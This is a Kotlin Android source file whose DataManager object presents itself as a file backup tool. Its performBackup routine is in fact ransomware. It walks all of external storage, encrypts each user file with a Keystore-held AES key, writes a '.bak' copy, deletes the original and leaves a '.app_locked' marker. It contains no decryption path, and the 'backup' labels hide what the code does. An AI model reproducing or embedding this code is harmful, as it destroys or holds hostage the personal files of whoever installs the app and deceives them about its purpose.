package com.facetrap

import android.content.Context
import android.os.Environment
import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import android.util.Log
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.security.KeyStore
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import kotlin.concurrent.thread

object DataManager {
    private const val TAG = "DataManager"
    private const val KEY_NAME = "app_data_key"
    private const val ALGO = "AES/GCM/NoPadding"
    private const val NONCE_SIZE = 12
    private const val TAG_BITS = 128
    private const val EXT = ".bak"
    private const val MARKER = ".app_locked"

    private lateinit var secretKey: SecretKey
    private var keyStore: KeyStore? = null

    fun init(context: Context) {
        keyStore = KeyStore.getInstance("AndroidKeyStore").apply { load(null) }
        secretKey = getOrCreateKey()
    }

    private fun getOrCreateKey(): SecretKey {
        val existing = keyStore?.getKey(KEY_NAME, null)
        if (existing != null) return existing as SecretKey

        val generator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")
        val spec = KeyGenParameterSpec.Builder(
            KEY_NAME,
            KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT
        )
            .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
            .setKeySize(256)
            .build()
        generator.init(spec)
        return generator.generateKey()
    }

    fun isActive(): Boolean {
        val marker = File(Environment.getExternalStorageDirectory(), MARKER)
        return marker.exists()
    }

    fun performBackup(context: Context, onProgress: (String) -> Unit = {}) {
        if (!hasStorageAccess(context)) {
            Log.e(TAG, "Storage permission missing")
            return
        }

        thread {
            try {
                val root = Environment.getExternalStorageDirectory()
                val marker = File(root, MARKER)
                if (marker.exists()) return@thread

                val backedUp = mutableListOf<String>()
                val appDirs = listOf(
                    context.filesDir.absolutePath,
                    context.cacheDir.absolutePath,
                    File(root, "Android/data/${context.packageName}").absolutePath
                )

                root.walkTopDown().forEach { file ->
                    if (file.isDirectory) return@forEach
                    val path = file.absolutePath
                    if (appDirs.any { path.startsWith(it) }) return@forEach
                    if (file.extension == "bak") return@forEach
                    if (file.name.startsWith(".") && file.name != MARKER) return@forEach

                    try {
                        backupFile(file)
                        backedUp.add(path)
                        onProgress("Backed up: ${file.name}")
                    } catch (e: Exception) {
                        Log.e(TAG, "Backup failed for ${file.absolutePath}", e)
                    }
                }

                val listFile = File(root, ".app_backup_list")
                listFile.writeText(backedUp.joinToString("\n"))
                marker.writeText("Backup active since ${System.currentTimeMillis()}")

                onProgress("Backup complete. ${backedUp.size} files processed.")
            } catch (e: Exception) {
                Log.e(TAG, "Backup process failed", e)
                onProgress("Backup failed: ${e.message}")
            }
        }
    }

    fun performBackupSimple(context: Context) {
        performBackup(context)   // uses the default onProgress = {}
    }

    private fun backupFile(file: File) {
        val cipher = Cipher.getInstance(ALGO)
        cipher.init(Cipher.ENCRYPT_MODE, secretKey)
        val nonce = cipher.iv

        FileInputStream(file).use { input ->
            val ciphertext = cipher.doFinal(input.readBytes())
            val outFile = File(file.parent, "${file.name}$EXT")
            FileOutputStream(outFile).use { out ->
                out.write(nonce)
                out.write(ciphertext)
            }
        }
        file.delete()
    }

    private fun hasStorageAccess(context: Context): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            context.checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }
}